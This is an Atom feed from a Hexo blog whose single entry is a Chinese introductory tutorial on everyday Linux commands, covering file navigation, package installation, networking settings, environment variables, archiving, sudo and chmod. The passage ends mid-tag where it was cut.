<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一条咸鱼</title>
  
  
  <link href="https://hisai3.github.io/hisai3.github.io/atom.xml" rel="self"/>
  
  <link href="https://hisai3.github.io/hisai3.github.io/"/>
  <updated>2023-12-18T02:12:37.879Z</updated>
  <id>https://hisai3.github.io/hisai3.github.io/</id>
  
  <author>
    <name>一条咸鱼</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux基础命令</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/12/18/Linux%E5%91%BD%E4%BB%A4/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/12/18/Linux%E5%91%BD%E4%BB%A4/</id>
    <published>2023-12-18T06:31:31.000Z</published>
    <updated>2023-12-18T02:12:37.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux的目录结构"><a href="#Linux的目录结构" class="headerlink" title="Linux的目录结构"></a>Linux的目录结构</h2><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027214128.png" alt="image-20221027214128453"></p><table><thead><tr><th>目录</th><th>说明</th></tr></thead><tbody><tr><td><strong>&#x2F;root</strong></td><td>该目录为<strong>系统管理员</strong>，也称作超级权限者的用户主目录。</td></tr><tr><td><strong>&#x2F;hom</strong>：</td><td>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以<strong>用户的账号命名</strong>的，如上图中的 alice、bob 和 eve。</td></tr><tr><td><strong>&#x2F;opt</strong></td><td>optional(可选) 的缩写，这是给主机<strong>额外安装软件</strong>所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</td></tr><tr><td><strong>&#x2F;etc</strong></td><td>Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的<strong>配置文件</strong>和<strong>子目录</strong>。</td></tr><tr><td><strong>&#x2F;var</strong></td><td>variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括<strong>各种日志文件</strong>。</td></tr><tr><td>&#x2F;tmp</td><td>temporary(临时) 的缩写这个目录是用来存放一些临时文件的。</td></tr><tr><td>&#x2F;usr</td><td>unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 <strong>program files</strong> 目录。</td></tr><tr><td>&#x2F;usr&#x2F;bin</td><td>系统用户使用的应用程序。</td></tr><tr><td>&#x2F;usr&#x2F;sbin</td><td>超级用户使用的比较高级的管理程序和系统守护程序。</td></tr></tbody></table><ul><li><code>/</code>，根目录是最顶级的目录了</li><li>Linux只有一个顶级目录：<code>/</code></li><li>路径描述的层次关系同样适用<code>/</code>来表示</li><li>&#x2F;home&#x2F;sample&#x2F;a.txt，表示根目录下的home文件夹内有sample文件夹，内有a.txt</li></ul><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><p>功能：列出文件夹信息</p><p>语法：<code>ls [-l -h -a] [参数]</code></p><ul><li>参数：被查看的文件夹，不提供参数，表示查看当前工作目录</li><li>-l，以列表形式查看</li><li>-h，配合-l，以更加人性化的方式显示文件大小</li><li>-a，显示隐藏文件</li></ul><h3 id="隐藏文件、文件夹"><a href="#隐藏文件、文件夹" class="headerlink" title="隐藏文件、文件夹"></a>隐藏文件、文件夹</h3><p>在Linux中以<code>.</code>开头的，均是隐藏的。</p><p>默认不显示出来，需要<code>-a</code>选项才可查看到。</p><h2 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h2><p>功能：展示当前工作目录</p><p>语法：<code>pwd</code></p><h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2><p>功能：切换工作目录</p><p>语法：<code>cd [目标目录]</code></p><p>参数：目标目录，要切换去的地方，不提供默认切换到<code>当前登录用户HOME目录</code></p><h2 id="HOME目录"><a href="#HOME目录" class="headerlink" title="HOME目录"></a>HOME目录</h2><p>每一个用户在Linux系统中都有自己的专属工作目录，称之为HOME目录。</p><ul><li><p>普通用户的HOME目录，默认在：<code>/home/用户名</code></p></li><li><p>root用户的HOME目录，在：<code>/root</code></p></li></ul><p>FinalShell登陆终端后，默认的工作目录就是用户的HOME目录</p><h2 id="相对路径、绝对路径"><a href="#相对路径、绝对路径" class="headerlink" title="相对路径、绝对路径"></a>相对路径、绝对路径</h2><ul><li><p>相对路径，&#x3D;&#x3D;非&#x3D;&#x3D;<code>/</code>开头的称之为相对路径</p><p>相对路径表示以<code>当前目录</code>作为起点，去描述路径，如<code>test/a.txt</code>，表示当前工作目录内的test文件夹内的a.txt文件</p></li><li><p>绝对路径，&#x3D;&#x3D;以&#x3D;&#x3D;<code>/</code>开头的称之为绝对路径</p><p>绝对路径从<code>根</code>开始描述路径</p></li></ul><h2 id="特殊路径符"><a href="#特殊路径符" class="headerlink" title="特殊路径符"></a>特殊路径符</h2><ul><li><code>.</code>，表示当前，比如.&#x2F;a.txt，表示当前文件夹内的<code>a.txt</code>文件</li><li><code>..</code>，表示上级目录，比如<code>../</code>表示上级目录，<code>../../</code>表示上级的上级目录</li><li><code>~</code>，表示用户的HOME目录，比如<code>cd ~</code>，即可切回用户HOME目录</li></ul><h2 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h2><p>功能：创建文件夹</p><p>语法：<code>mkdir [-p] 参数</code></p><ul><li>参数：被创建文件夹的路径</li><li>选项：-p，可选，表示创建前置路径</li></ul><h2 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h2><p>功能：创建文件</p><p>语法：<code>touch 参数</code></p><ul><li>参数：被创建的文件路径</li></ul><h2 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h2><p>功能：查看文件内容</p><p>语法：<code>cat 参数</code></p><ul><li>参数：被查看的文件路径</li></ul><h2 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a>more命令</h2><p>功能：查看文件，可以支持翻页查看</p><p>语法：<code>more 参数</code></p><ul><li>参数：被查看的文件路径</li><li>在查看过程中：<ul><li><code>空格</code>键翻页</li><li><code>q</code>退出查看</li></ul></li></ul><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>功能：复制文件、文件夹</p><p>语法：<code>cp [-r] 参数1 参数2</code></p><ul><li>参数1，被复制的</li><li>参数2，要复制去的地方</li><li>选项：-r，可选，复制文件夹使用</li></ul><p>示例：</p><ul><li>cp a.txt b.txt，复制当前目录下a.txt为b.txt</li><li>cp a.txt test&#x2F;，复制当前目录a.txt到test文件夹内</li><li>cp -r test test2，复制文件夹test到当前文件夹内为test2存在</li></ul><h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h2><p>功能：移动文件、文件夹</p><p>语法：<code>mv 参数1 参数2</code></p><ul><li>参数1：被移动的</li><li>参数2：要移动去的地方，参数2如果不存在，则会进行改名</li></ul><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><p>功能：删除文件、文件夹</p><p>语法：<code>rm [-r -f] 参数...参数</code></p><ul><li>参数：支持多个，每一个表示被删除的，空格进行分隔</li><li>选项：-r，删除文件夹使用</li><li>选项：-f，强制删除，不会给出确认提示，一般root用户会用到</li></ul><blockquote><p>rm命令很危险，一定要注意，特别是切换到root用户的时候。</p></blockquote><h2 id="which命令"><a href="#which命令" class="headerlink" title="which命令"></a>which命令</h2><p>功能：查看命令的程序本体文件路径</p><p>语法：<code>which 参数</code></p><ul><li>参数：被查看的命令</li></ul><h2 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h2><p>功能：搜索文件</p><p>语法1按文件名搜索：<code>find 路径 -name 参数</code></p><ul><li>路径，搜索的起始路径</li><li>参数，搜索的关键字，支持通配符*， 比如：<code>*</code>test表示搜索任意以test结尾的文件</li></ul><h2 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h2><p>功能：过滤关键字</p><p>语法：<code>grep [-n] 关键字 文件路径</code></p><ul><li>选项-n，可选，表示在结果中显示匹配的行的行号。</li><li>参数，关键字，必填，表示过滤的关键字，带有空格或其它特殊符号，建议使用””将关键字包围起来</li><li>参数，文件路径，必填，表示要过滤内容的文件路径，可作为内容输入端口</li></ul><blockquote><p>参数文件路径，可以作为管道符的输入</p></blockquote><h2 id="wc命令"><a href="#wc命令" class="headerlink" title="wc命令"></a>wc命令</h2><p>功能：统计</p><p>语法：<code>wc [-c -m -l -w] 文件路径</code></p><ul><li>选项，-c，统计bytes数量</li><li>选项，-m，统计字符数量</li><li>选项，-l，统计行数</li><li>选项，-w，统计单词数量</li><li>参数，文件路径，被统计的文件，可作为内容输入端口</li></ul><blockquote><p>参数文件路径，可作为管道符的输入</p></blockquote><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符|"></a>管道符|</h2><p>写法：<code>|</code></p><p>功能：将符号左边的结果，作为符号右边的输入</p><p>示例：</p><p><code>cat a.txt | grep sample</code>，将cat a.txt的结果，作为grep命令的输入，用来过滤<code>sample</code>关键字</p><p>可以支持嵌套：</p><p><code>cat a.txt | grep sample | grep itcast</code></p><h2 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h2><p>功能：输出内容</p><p>语法：<code>echo 参数</code></p><ul><li>参数：被输出的内容</li></ul><h2 id="96-反引号"><a href="#96-反引号" class="headerlink" title="&#96;反引号"></a>&#96;反引号</h2><p>功能：被两个反引号包围的内容，会作为命令执行</p><p>示例：</p><ul><li>echo `pwd`，会输出当前工作目录</li></ul><h2 id="tail命令"><a href="#tail命令" class="headerlink" title="tail命令"></a>tail命令</h2><p>功能：查看文件尾部内容</p><p>语法：<code>tail [-f] 参数</code></p><ul><li>参数：被查看的文件</li><li>选项：-f，持续跟踪文件修改</li></ul><h2 id="head命令"><a href="#head命令" class="headerlink" title="head命令"></a>head命令</h2><p>功能：查看文件头部内容</p><p>语法：<code>head [-n] 参数</code></p><ul><li>参数：被查看的文件</li><li>选项：-n，查看的行数</li></ul><h2 id="重定向符"><a href="#重定向符" class="headerlink" title="重定向符"></a>重定向符</h2><p>功能：将符号左边的结果，输出到右边指定的文件中去</p><ul><li><code>&gt;</code>，表示覆盖输出</li><li><code>&gt;&gt;</code>，表示追加输出</li></ul><h2 id="vi编辑器"><a href="#vi编辑器" class="headerlink" title="vi编辑器"></a>vi编辑器</h2><h3 id="命令模式快捷键"><a href="#命令模式快捷键" class="headerlink" title="命令模式快捷键"></a>命令模式快捷键</h3><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027215841.png" alt="image-20221027215841573"></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027215846.png" alt="image-20221027215846581"></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027215849.png" alt="image-20221027215849668"></p><h3 id="底线命令快捷键"><a href="#底线命令快捷键" class="headerlink" title="底线命令快捷键"></a>底线命令快捷键</h3><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027215858.png" alt="image-20221027215858967"></p><h2 id="命令的选项"><a href="#命令的选项" class="headerlink" title="命令的选项"></a>命令的选项</h2><p>比如，简单的ls命令就有：-a -A -b -c -C -d -D -f -F -g -G -h -H -i -I -k -l -L -m -n -N -o -p -q -Q -r-R -s -S -t -T -u -U -v -w -x -X -1等选项，可以发现选项是极其多的。</p><h3 id="查看命令的帮助"><a href="#查看命令的帮助" class="headerlink" title="查看命令的帮助"></a>查看命令的帮助</h3><p>可以通过：<code>命令 --help</code>查看命令的帮助手册</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027220005.png" alt="image-20221027220005610"></p><h3 id="查看命令的详细手册"><a href="#查看命令的详细手册" class="headerlink" title="查看命令的详细手册"></a>查看命令的详细手册</h3><p>可以通过：<code>man 命令</code>查看某命令的详细手册</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027220010.png" alt="image-20221027220009949"></p><h1 id="Linux常用操作"><a href="#Linux常用操作" class="headerlink" title="Linux常用操作"></a>Linux常用操作</h1><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><ul><li>CentOS系统使用：<ul><li>yum [install remove search] [-y] 软件名称<ul><li>install 安装</li><li>remove 卸载</li><li>search 搜索</li><li>-y，自动确认</li></ul></li></ul></li></ul><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>使用yum安装的软件包通常都会遵循相似的目录结构</p><table><thead><tr><th>安装路径</th><th>含义</th></tr></thead><tbody><tr><td>&#x2F;etc</td><td>配置文件</td></tr><tr><td>&#x2F;var&#x2F;log</td><td>日志文件</td></tr><tr><td>&#x2F;usr&#x2F;sbin</td><td>可执行文件(包括服务管理工具)</td></tr></tbody></table><p><strong>RPM</strong> 是一种软件包的格式和工具，而 <strong>yum</strong> 则是建立在RPM 格式之上的更高层次的<strong>软件包管理工具</strong>。</p><p>yum 提供了更便捷的软件包管理功能，可以自动处理依赖关系，并从指定的软件源中获取软件包。</p><p>所以我们可以从对应的<strong>官网</strong>直接看<strong>RPM</strong>的包组织格式就行了。</p><p><strong>以Mysql为例:</strong>  进入Mysql官网 》reference manual 》search ‘RPM’</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a941a145f9374273afcf037bcd54b36d~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=962&h=380&s=106118&e=png&b=fdfcfc" alt="image.png"></p><h3 id="查看已下载的软件包"><a href="#查看已下载的软件包" class="headerlink" title="查看已下载的软件包"></a>查看已下载的软件包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list installed</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep 软件包名</span><br></pre></td></tr></table></figure><h3 id="查看安装之后软件包在哪"><a href="#查看安装之后软件包在哪" class="headerlink" title="查看安装之后软件包在哪"></a>查看安装之后软件包在哪</h3><p>1.<code>RPM</code> 查看yum安装的软件被安装到了哪个目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ql 软件包名</span><br></pre></td></tr></table></figure><p>2.<code>whereis</code>  可以快速定位<strong>二进制文件、源代码文件和帮助文件</strong>的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis 软件包名</span><br></pre></td></tr></table></figure><p>3.<code>which </code>快速查找<strong>可执行文件</strong>的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which 软件包名</span><br></pre></td></tr></table></figure><h3 id="修改安装路径"><a href="#修改安装路径" class="headerlink" title="修改安装路径"></a>修改安装路径</h3><ol><li><p>使用命令修改配置文件 vim &#x2F;etc&#x2F;yum.conf， <code>installroot</code> 参数是设置Yum安装路径的参数</p></li><li><p>命令修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum  --installroot=/opt/yum install yum -y</span><br></pre></td></tr></table></figure></li></ol><ul><li>Ubuntu系统使用<ul><li>apt [install remove search] [-y] 软件名称<ul><li>install 安装</li><li>remove 卸载</li><li>search 搜索</li><li>-y，自动确认</li></ul></li></ul></li></ul><blockquote><p>yum 和 apt 均需要root权限</p></blockquote><h2 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h2><p>功能：控制系统服务的启动关闭等</p><p>语法：<code>systemctl start | stop | restart | disable | enable | status 服务名</code></p><ul><li>start，启动</li><li>stop，停止</li><li>status，查看状态</li><li>disable，关闭开机自启</li><li>enable，开启开机自启</li><li>restart，重启</li></ul><h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><p>功能：创建文件、文件夹软链接（快捷方式）</p><p>语法：<code>ln -s 参数1 参数2</code></p><ul><li>参数1：被链接的</li><li>参数2：要链接去的地方（快捷方式的名称和存放位置）</li></ul><h2 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h2><p>语法：<code>date [-d] [+格式化字符串]</code></p><ul><li><p>-d 按照给定的字符串显示日期，一般用于日期计算</p></li><li><p>格式化字符串：通过特定的字符串标记，来控制显示的日期格式</p><ul><li>%Y   年%y   年份后两位数字 (00..99)</li><li>%m   月份 (01..12)</li><li>%d   日 (01..31)</li><li>%H   小时 (00..23)</li><li>%M   分钟 (00..59)</li><li>%S   秒 (00..60)</li><li>%s   自 1970-01-01 00:00:00 UTC 到现在的秒数</li></ul></li></ul><p>示例：</p><ul><li><p>按照2022-01-01的格式显示日期</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027220514.png" alt="image-20221027220514640"></p></li><li><p>按照2022-01-01 10:00:00的格式显示日期</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027220525.png" alt="image-20221027220525625"></p></li><li><p>-d选项日期计算</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027220429.png" alt="image-20221027220429831"></p><ul><li><p>支持的时间标记为：</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027220449.png" alt="image-20221027220449312"></p></li></ul></li></ul><h2 id="时区"><a href="#时区" class="headerlink" title="时区"></a>时区</h2><p>修改时区为中国时区</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027220554.png" alt="image-20221027220554654"></p><h2 id="ntp"><a href="#ntp" class="headerlink" title="ntp"></a>ntp</h2><p>功能：同步时间</p><p>安装：<code>yum install -y ntp</code></p><p>启动管理：<code>systemctl start | stop | restart | status | disable | enable ntpd</code></p><p>手动校准时间：<code>ntpdate -u ntp.aliyun.com</code></p><h2 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h2><p>格式：a.b.c.d</p><ul><li>abcd为0~255的数字</li></ul><p>特殊IP：</p><ul><li>127.0.0.1，表示本机</li><li>0.0.0.0<ul><li>可以表示本机</li><li>也可以表示任意IP（看使用场景）</li></ul></li></ul><p>查看ip：<code>ifconfig</code></p><h2 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h2><p>功能：Linux系统的名称</p><p>查看：<code>hostname</code></p><p>设置：<code>hostnamectl set-hostname 主机名</code></p><h2 id="配置VMware固定IP"><a href="#配置VMware固定IP" class="headerlink" title="配置VMware固定IP"></a>配置VMware固定IP</h2><ol><li><p>修改VMware网络，参阅PPT，图太多</p></li><li><p>设置Linux内部固定IP</p><p>修改文件：<code>/etc/sysconfig/network-scripts/ifcfg-ens33</code></p><p>示例文件内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;# 改为static，固定IP</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;1b0011cb-0d2e-4eaa-8a11-af7d50ebc876&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">IPADDR=&quot;192.168.88.131&quot;# IP地址，自己设置，要匹配网络范围</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;# 子网掩码，固定写法255.255.255.0</span><br><span class="line">GATEWAY=&quot;192.168.88.2&quot;# 网关，要和VMware中配置的一致</span><br><span class="line">DNS1=&quot;192.168.88.2&quot;# DNS1服务器，和网关一致即可</span><br></pre></td></tr></table></figure></li></ol><h2 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h2><p>功能：查看进程信息</p><p>语法：<code>ps -ef</code>，查看全部进程信息，可以搭配grep做过滤：<code>ps -ef | grep xxx</code></p><h2 id="kill命令"><a href="#kill命令" class="headerlink" title="kill命令"></a>kill命令</h2><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221303.png" alt="image-20221027221303037"></p><h2 id="nmap命令"><a href="#nmap命令" class="headerlink" title="nmap命令"></a>nmap命令</h2><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221241.png" alt="image-20221027221241123"></p><h2 id="netstat命令"><a href="#netstat命令" class="headerlink" title="netstat命令"></a>netstat命令</h2><p>功能：查看端口占用</p><p>用法：<code>netstat -anp | grep xxx</code></p><h2 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h2><p>测试网络是否联通</p><p>语法：<code>ping [-c num] 参数</code></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221129.png" alt="image-20221027221129782"></p><h2 id="wget命令"><a href="#wget命令" class="headerlink" title="wget命令"></a>wget命令</h2><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221149.png" alt="image-20221027221148964"></p><p> <strong>wget: 未找到命令</strong></p><h2 id="curl命令"><a href="#curl命令" class="headerlink" title="curl命令"></a>curl命令</h2><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221201.png" alt="image-20221027221201079"></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221210.png" alt="image-20221027221210518"></p><h2 id="top命令"><a href="#top命令" class="headerlink" title="top命令"></a>top命令</h2><p>功能：查看主机运行状态</p><p>语法：<code>top</code>，查看基础信息</p><p>可用选项：</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221340.png" alt="image-20221027221340729"></p><p>交互式模式中，可用快捷键：</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221354.png" alt="image-20221027221354137"></p><h2 id="df命令"><a href="#df命令" class="headerlink" title="df命令"></a>df命令</h2><p>查看磁盘占用</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221413.png" alt="image-20221027221413787"></p><h2 id="iostat命令"><a href="#iostat命令" class="headerlink" title="iostat命令"></a>iostat命令</h2><p>查看CPU、磁盘的相关信息</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221440.png" alt="image-20221027221439990"></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221514.png" alt="image-20221027221514237"></p><h2 id="sar命令"><a href="#sar命令" class="headerlink" title="sar命令"></a>sar命令</h2><p>查看网络统计</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221545.png" alt="image-20221027221545822"></p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><ul><li>临时设置：export 变量名&#x3D;变量值</li><li>永久设置：<ul><li>针对用户，设置用户HOME目录内：<code>.bashrc</code>文件</li><li>针对全局，设置<code>/etc/profile</code>, 修改之后执行 source &#x2F;etc&#x2F;profile 生效</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/nginx/sbin</span><br></pre></td></tr></table></figure><p><strong>配置完环境source之后出现了以下报错</strong></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/39142acae08f41dda242e56cbbb832ff~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=486&h=73&s=7309&e=png&b=000000" alt="image.png"></p><p><strong>执行下面命令 重新修改</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/usr/bin:/usr/sbin:/bin:/sbin:/usr/X11R6/bin source</span><br></pre></td></tr></table></figure><h3 id="PATH变量"><a href="#PATH变量" class="headerlink" title="PATH变量"></a>PATH变量</h3><p>记录了执行程序的搜索路径</p><p>可以将自定义路径加入PATH内，实现自定义命令在任意地方均可执行的效果</p><h2 id="符号"><a href="#符号" class="headerlink" title="$符号"></a>$符号</h2><p>可以取出指定的环境变量的值</p><p>语法：<code>$变量名</code></p><p>示例：</p><p><code>echo $PATH</code>，输出PATH环境变量的值</p><p><code>echo $&#123;PATH&#125;ABC</code>，输出PATH环境变量的值以及ABC</p><p>如果变量名和其它内容混淆在一起，可以使用${}</p><h2 id="压缩解压"><a href="#压缩解压" class="headerlink" title="压缩解压"></a>压缩解压</h2><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p><code>tar -zcvf 压缩包 被压缩1...被压缩2...被压缩N</code></p><ul><li>-z表示使用gzip，可以不写</li></ul><p><code>zip [-r] 参数1 参数2 参数N</code></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221906.png" alt="image-20221027221906247"></p><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p><code>tar -zxvf 被解压的文件 -C 要解压去的地方</code></p><ul><li>-z表示使用gzip，可以省略</li><li>-C，可以省略，指定要解压去的地方，不写解压到当前目录</li></ul><p><code>unzip [-d] 参数</code></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027221939.png" alt="image-20221027221939899"></p><h2 id="su命令"><a href="#su命令" class="headerlink" title="su命令"></a>su命令</h2><p>切换用户</p><p>语法：<code>su [-] [用户]</code></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027222021.png" alt="image-20221027222021619"></p><h2 id="sudo命令"><a href="#sudo命令" class="headerlink" title="sudo命令"></a>sudo命令</h2><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027222035.png" alt="image-20221027222035337"></p><p>比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username ALL=(ALL)       NOPASSWD: ALL</span><br></pre></td></tr></table></figure><p>在visudo内配置如上内容，可以让指定用户，无需密码直接使用<code>sudo</code></p><p>检测是否安装了sudo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# rpm -q sudo</span><br><span class="line">sudo-1.6.8p12-4.1</span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>含义</th><th>作用</th></tr></thead><tbody><tr><td>sudo -h</td><td>Help</td><td>列出使用方法，退出。</td></tr><tr><td>sudo -V</td><td>Version</td><td>显示版本信息，并退出。</td></tr><tr><td>sudo -l</td><td>List</td><td>列出当前用户可以执行的命令。只有在sudoers里的用户才能使用该选项。</td></tr><tr><td>sudo -u username#uid</td><td>User</td><td>以指定用户的身份执行命令。后面的用户是除root以外的，可以是用户名，也可以是#uid。</td></tr><tr><td>sudo -k</td><td>Kill</td><td>清除“入场卷”上的时间，下次再使用sudo时要再输入密码。</td></tr><tr><td>sudo -K</td><td>Sure kill</td><td>与-k类似，但是它还要撕毁“入场卷”，也就是删除时间戳文件。</td></tr><tr><td>sudo -b command</td><td>Background</td><td>在后台执行指定的命令。</td></tr><tr><td>sudo -p prompt command</td><td>Prompt</td><td>可以更改询问密码的提示语，其中%u会代换为使用者帐号名称，%h会显示主机名称。非常人性化的设计。</td></tr><tr><td>sudo -e file</td><td>Edit</td><td>不是执行命令，而是修改文件，相当于命令sudoedit</td></tr></tbody></table><h2 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h2><p>修改文件、文件夹权限</p><p>语法：<code>chmod [-R] 权限 参数</code></p><ul><li><p>权限，要设置的权限，比如755，表示：<code>rwxr-xr-x</code></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027222157.png" 